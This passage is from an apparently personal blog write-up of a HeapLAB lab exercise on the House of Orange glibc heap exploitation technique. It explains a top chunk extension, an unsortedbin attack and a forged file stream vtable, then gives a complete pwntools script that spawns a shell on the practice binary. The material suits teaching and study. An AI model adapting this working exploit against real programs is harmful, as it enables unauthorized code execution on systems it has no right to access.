<li>Since the heap overflow bug allows to perform an arbitrary write on the top chunk header, the phase 1 is completed by exploiting the <strong>Top Chunk Extension</strong> mechanism to free a chunk without calling free().</li>
</ul>
<p>The binary leaks the heap top chunk address ("heap @") and the puts libc function address ("puts() @"). </p>
<blockquote>
<p>=============== |   HeapLAB   |  House of Orange ===============<br/>
<br/><br/>
puts() @ 0x7f609c2675a0<br/>
heap @ 0x55e83625a000<br/>
<br/><br/>
1) malloc (small) 0/2<br/>
2) malloc (large) 0/1<br/>
3) edit (1st small chunk)<br/>
4) quit<br/>
&gt;</p>
</blockquote>
<p>The "malloc (small)" allocates a 0x20 sized chunk whilst the "malloc (large)" function allocates a 0xfd0 sized chunk. The "edit" function is subject to an heap overflow. </p>
<p>Since there's no "free" function, abusing the heap overflow, the <strong>Top Chunk Extensions</strong> it's needed to make the top chunk be moved to the unsortedbin.</p>
<p><code>malloc_small()</code></p>
<p><code>page_size = 0x1000</code></p>
<p><code>edit(b"A"*0x10 + p64(0) + p64(page_size - 0x20 + 1))</code></p>
<p>To pass the consistency check, the prev_inuse bit must be set and the fake size must not border any memory page: page_size - 0x20 + 1. Otherwise, the following error would be generated:</p>
<blockquote>
<p>house_of_orange: malloc.c:2395: sysmalloc: Assertion `(old_top == initial_top (av) &amp;&amp; old_size == 0) || ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp; prev_inuse (old_top) &amp;&amp; ((unsigned long) old_end &amp; (pagesize - 1)) == 0)' failed.</p>
</blockquote>
<p>Abusing the edit function, the top_chunk size field will be overridden by the overflow; shrinking the top_chunk size (being in the main arena), will trigger the <strong>top chunk extension</strong> process the moment the large chunk allocation is requested: the altered top_chunk can't now fit the large chunk size.</p>
<p><code>malloc_large()</code></p>
<p>A new top chunk is generated and the old one is placed into the unsortedbin:</p>
<p><img alt="Top Chunk Extension" src="/images/binary-exploitation/heap-journey/house_of_orange/house-of-orange-1.png"/></p>
<p>Having now a free chunk into the unsortedbin, it's possible to perform the second phase of the House of Orange attack: the Unsortedbin attack. Taking again advantage of the edit function, the freed chunk (old top chunk) is forged as a file stream, preparing it for the last phase of the attack. </p>
<p>Remaining only one last allocation for a small chunk, malloc would check into unsortedbin for any free chunk that fits this size. Being the partial unlink the vector for the phase 3, it's necessary that malloc performs a sorting instead of an allocation so the free chunk size field must be edited again. </p>
<ul>
<li>This time a 0x60 size is chosen: when the partial unlink is performed, the freed chunk will be moved to the smallbins</li>
</ul>
<p><code>new_size = 0x60</code></p>
<p>A fake stream is forged by looking at the file stream pointed by the _IO_list_all, the stderr:</p>
<blockquote>
<p>gef &gt;  print *_IO_list_all<br/>
$1 = {<br/>
  file = {<br/>
    _flags = 0xfbad2086,<br/>
    _IO_read_ptr = 0x0,<br/>
    _IO_read_end = 0x0,<br/>
    _IO_read_base = 0x0,<br/>
    _IO_write_base = 0x0,<br/>
    _IO_write_ptr = 0x0,<br/>
    _IO_write_end = 0x0,<br/>
    _IO_buf_base = 0x0,<br/>
    _IO_buf_end = 0x0,<br/>
    _IO_save_base = 0x0,<br/>
    _IO_backup_base = 0x0,<br/>
    _IO_save_end = 0x0,<br/>
    _markers = 0x0,<br/>
    _chain = 0x7ffff7b9a620 &lt;<em>IO_2_1_stdout</em>&gt;,<br/>
    _fileno = 0x2,<br/>
    _flags2 = 0x0,<br/>
    _old_offset = 0xffffffffffffffff,<br/>
    _cur_column = 0x0,<br/>
    _vtable_offset = 0x0,<br/>
    _shortbuf = "",<br/>
    _lock = 0x7ffff7b9b770 &lt;_IO_stdfile_2_lock&gt;,<br/>
    _offset = 0xffffffffffffffff,<br/>
    _codecvt = 0x0,<br/>
    _wide_data = 0x7ffff7b99660 &lt;_IO_wide_data_2&gt;,<br/>
    _freeres_list = 0x0,<br/>
    _freeres_buf = 0x0,<br/>
    __pad5 = 0x0,<br/>
    _mode = 0x0,<br/>
    _unused2 = '\000' <repeats 19="" times=""><br/>
  },<br/>
  vtable = 0x7ffff7b986e0 &lt;__GI__IO_file_jumps&gt;<br/>
}  </repeats></p>
</blockquote>
<p><img alt="File Stream Layout" src="/images/binary-exploitation/heap-journey/house_of_orange/house-of-orange-2.png"/></p>
<p>When forging the file stream, the vtable address is precisely calculated to make the system @ be located where __overflow is supposed to be in the  vtable. Looking at the stdout vtable:</p>
<p><img alt="File Stream Layout - vtable" src="/images/binary-exploitation/heap-journey/house_of_orange/house-of-orange-3.png"/></p>
<ul>
<li>the __overflow is placed at the fourth quadword of the stderr memory space</li>
</ul>
<p>Having all these information, the fake stream is forged as follows:</p>
<div class="highlight"><pre><span></span><code><span class="nx">prev_size</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">b</span><span class="s">"/bin/sh\0"</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">overlaps</span><span class="w"> </span><span class="nx">_flag_field</span>
<span class="nx">new_size</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x60</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">valid</span><span class="w"> </span><span class="nx">smallbin</span><span class="w"> </span><span class="nx">size</span><span class="w"> </span><span class="nx">so</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">free</span><span class="w"> </span><span class="nx">chunk</span><span class="w"> </span><span class="nx">gets</span><span class="w"> </span><span class="nx">sorted</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">smallbins</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">triggering</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="k">partial</span><span class="w"> </span><span class="nx">unlink</span><span class="w"> </span><span class="nx">process</span>
<span class="nx">write_base</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">1</span>
<span class="nx">write_ptr</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">2</span>
<span class="nx">junk_size</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0x12</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x8</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="nx">there</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="mh">0x12</span><span class="w"> </span><span class="p">(</span><span class="mi">18</span><span class="p">)</span><span class="w"> </span><span class="nx">addresses</span><span class="w"> </span><span class="p">(</span><span class="nx">of</span><span class="w"> </span><span class="nx">size</span><span class="w"> </span><span class="mh">0x8</span><span class="p">)</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">fill</span><span class="w"> </span><span class="nx">before</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">mode</span><span class="w"> </span><span class="nx">field</span>

<span class="nx">mode</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mh">0xffffffff</span>
<span class="nx">padding</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="err">#</span><span class="w"> </span><span class="nx">vtable_offset</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">first</span><span class="w"> </span><span class="nx">small</span><span class="w"> </span><span class="nx">chunk</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">old</span><span class="w"> </span><span class="nx">top</span><span class="w"> </span><span class="nx">chunk</span><span class="w"> </span><span class="nx">header</span><span class="w"> </span><span class="nx">size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">fd</span><span class="p">,</span><span class="w"> </span><span class="nx">bk</span><span class="p">.</span><span class="w"> </span><span class="nx">write_base</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="nx">write_ptr</span><span class="w"> </span><span class="nx">pointers</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">junk_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">_mode</span><span class="w"> </span><span class="nx">size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">padding</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x8</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="nx">__overflow</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">fourth</span><span class="w"> </span><span class="nx">quadword</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">vtable</span><span class="p">;</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">make</span><span class="w"> </span><span class="nx">__overflow</span><span class="w"> </span><span class="nx">overlap</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">system</span><span class="p">()</span><span class="w"> </span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">move</span><span class="w"> </span><span class="nx">back</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="nx">quadwords</span><span class="p">)</span>

<span class="nx">vtable_offset</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">small_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">header_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x8</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">junk_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x8</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x8</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span><span class="mh">0x8</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span>

<span class="err">#</span><span class="w"> </span><span class="nx">locate</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">vtable</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">position</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">heap</span><span class="w"> </span><span class="nx">so</span><span class="w"> </span><span class="nx">that</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">__overflow</span><span class="w"> </span><span class="nx">overlaps</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">system</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">located</span><span class="w"> </span><span class="nx">into</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">old</span><span class="w"> </span><span class="nx">top</span><span class="w"> </span><span class="nx">chunk</span><span class="w"> </span><span class="p">(</span><span class="nx">placed</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">convenience</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">end</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">fake</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">stream</span><span class="w"> </span><span class="nx">overlapping</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">_unused2</span><span class="w"> </span><span class="nx">area</span><span class="p">)</span>
<span class="nx">vtable_ptr</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">heap_base_addr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">vtable_offset</span>

<span class="nx">edit</span><span class="p">(</span>
<span class="w">        </span><span class="nx">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x10</span><span class="w"> </span><span class="o">+</span><span class="w"> </span>
<span class="w">        </span><span class="nx">prev_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="nx">new_size</span><span class="w"> </span><span class="o">+</span><span class="mi">1</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span>
<span class="w">        </span><span class="nx">p64</span><span class="p">(</span><span class="nx">fd_pointer</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="nx">bk_pointer</span><span class="p">)</span><span class="w"> </span><span class="o">+</span>
<span class="w">        </span><span class="nx">p64</span><span class="p">(</span><span class="nx">write_base</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="nx">write_ptr</span><span class="p">)</span><span class="w"> </span><span class="o">+</span>
<span class="w">        </span><span class="nx">b</span><span class="s">"B"</span><span class="o">*</span><span class="nx">junk_size</span><span class="w"> </span><span class="o">+</span><span class="w"> </span>
<span class="w">        </span><span class="nx">p32</span><span class="p">(</span><span class="nx">mode</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">padding</span><span class="w"> </span><span class="o">+</span><span class="w"> </span>
<span class="w">        </span><span class="nx">p64</span><span class="p">(</span><span class="nx">libc</span><span class="p">.</span><span class="nx">sym</span><span class="p">.</span><span class="nx">system</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">p64</span><span class="p">(</span><span class="nx">vtable_ptr</span><span class="p">)</span>
<span class="w">        </span><span class="p">)</span>
</code></pre></div>
<p>Triggering the partial unlink process by requesting a new chunk allocation will make the unsortedbin address being written in the _IO_list_all pointer. Now, the main area is being considered as a stream file:</p>
<p><img alt="Main arena as file stream" src="/images/binary-exploitation/heap-journey/house_of_orange/house-of-orange-3.png"/></p>
<p>Since the _mode field is filled with casual values, sometimes the flushing check is passed leading to a general fault being the fake stream really messy. Some other times, the flushing check will not pass, then the _IO_list_all _chain will be followed: the old top chunk will be evaluated as if it's a file stream. </p>
<ul>
<li>Being forged as a valid file stream, it will pass the flushing check and the __overflow function defined in it's vtable will be executed.</li>
</ul>
<p>The complete solution is the following:</p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./house_of_orange"</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"../.glibc/glibc_2.23/libc.so.6"</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">"./house_of_orange"</span><span class="p">)</span>
<span class="c1">#p = process("./house_of_orange")</span>

<span class="c1"># Use leaked libc puts() address and its offset to determine libc base address</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"puts() @ "</span><span class="p">)</span>
<span class="n">puts_leaked_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
<span class="n">libc_base_addr</span> <span class="o">=</span> <span class="n">puts_leaked_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">puts</span>
<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_base_addr</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"libc base address 0x</span><span class="si">{</span><span class="n">libc_base_addr</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"heap @ "</span><span class="p">)</span>
<span class="n">heap_base_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"heap base address 0x</span><span class="si">{</span><span class="n">heap_base_addr</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">malloc_small</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">malloc_large</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"2"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"3"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">"data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">"&gt; "</span><span class="p">)</span>

<span class="n">header_size</span> <span class="o">=</span> <span class="mh">0x10</span>
<span class="n">small_size</span> <span class="o">=</span> <span class="mh">0x20</span>
<span class="n">large_size</span> <span class="o">=</span> <span class="mh">0xfd0</span>
<span class="n">page_size</span> <span class="o">=</span> <span class="mh">0x1000</span> <span class="c1"># obtained with shell command getconf PAGESIZE</span>
<span class="n">malloc_small</span><span class="p">()</span>

<span class="c1"># Step 1: abuse top chunk extension to generate a free chunk into the unsortedbin by shrinking actual top chunk size - page_size is used to pass the consistency check into sysmalloc() function</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">Perform Top Chunk Extension attack</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">page_size</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>

<span class="n">malloc_large</span><span class="p">()</span>

<span class="c1"># Step 2: prepare the fake free chunk (old top chunk) for the unsortedbin attack by setting the target address (_IO_list_all) as the bk_pointer</span>

<span class="n">fd_pointer</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span>
<span class="n">bk_pointer</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_list_all</span> <span class="o">-</span> <span class="n">header_size</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"_IO_list_all_pointer 0x</span><span class="si">{</span><span class="n">bk_pointer</span><span class="si">:</span><span class="s2">02x</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

<span class="n">prev_size</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"/bin/sh</span><span class="se">\0</span><span class="s2">"</span> <span class="c1"># overlaps _flag_field</span>
<span class="n">new_size</span> <span class="o">=</span> <span class="mh">0x60</span> <span class="c1"># a valid smallbin size so that the free chunk gets sorted into smallbins - triggering the partial unlink process</span>
<span class="n">write_base</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">write_ptr</span> <span class="o">=</span> <span class="mi">2</span>
<span class="n">junk_size</span> <span class="o">=</span> <span class="mh">0x12</span> <span class="o">*</span> <span class="mh">0x8</span> <span class="c1"># there are 0x12 (18) addresses (of size 0x8) to fill before the mode field</span>

<span class="n">mode</span> <span class="o">=</span> <span class="mh">0xffffffff</span>
<span class="n">padding</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1"># vtable_offset = first small chunk + old top chunk header size + fd, bk. write_base and write_ptr pointers + junk_size + _mode size + padding - 3 * 0x8 ( __overflow is the fourth quadword into the vtable; to make __overflow overlap the system() address, move back of 3 quadwords)</span>

<span class="n">vtable_offset</span> <span class="o">=</span> <span class="n">small_size</span> <span class="o">+</span> <span class="n">header_size</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">junk_size</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">+</span> <span class="mh">0x8</span> <span class="o">-</span> <span class="p">(</span><span class="mh">0x8</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span>

<span class="c1"># locate the vtable in a position into the heap so that the __overflow overlaps the system address located into the old top chunk (placed for convenience at the end of the fake file stream overlapping the _unused2 area)</span>
<span class="n">vtable_ptr</span> <span class="o">=</span> <span class="n">heap_base_addr</span> <span class="o">+</span> <span class="n">vtable_offset</span>

<span class="n">edit</span><span class="p">(</span>
        <span class="sa">b</span><span class="s2">"A"</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> 
        <span class="n">prev_size</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">new_size</span> <span class="o">+</span><span class="mi">1</span> <span class="p">)</span> <span class="o">+</span> 
        <span class="n">p64</span><span class="p">(</span><span class="n">fd_pointer</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk_pointer</span><span class="p">)</span> <span class="o">+</span>
        <span class="n">p64</span><span class="p">(</span><span class="n">write_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_ptr</span><span class="p">)</span> <span class="o">+</span>
        <span class="sa">b</span><span class="s2">"B"</span><span class="o">*</span><span class="n">junk_size</span> <span class="o">+</span> 
        <span class="n">p32</span><span class="p">(</span><span class="n">mode</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> 
        <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vtable_ptr</span><span class="p">)</span>
        <span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"</span><span class="se">\n</span><span class="s2">Triggering Unsortedbin partial unlink</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s2">"1"</span><span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="s2">"If main_area fake file stream is not flushed, it's _chain will be followed and the fake stream overlapping with the old top chunk should trigger the __overflow function passing the flushing check. In not, re-run the script"</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div>
  </div>
  <div class="tag-cloud">
    <p>
    </p>
  </div>






</article>

<footer>
<p>&copy; Jack69 - 2025 </p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="http://localhost:1337/theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="dark"
          type="text/javascript">
  </script>
</p></footer>  </main>

<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Jack's Corner ",
  "url" : "http://localhost:1337",
  "image": "",
  "description": "My personal notes on stuff I like, nothing special"
}
</script>  <script>
    window.loadStorkIndex = function () {
      stork.initialize("http://localhost:1337/theme/stork/stork.wasm")
      stork.register("sitesearch", "http://localhost:1337/search-index.st", { showProgress: false });
    }
  </script>
  <script src="http://localhost:1337/theme/stork/stork.js"></script>

</body>
</html>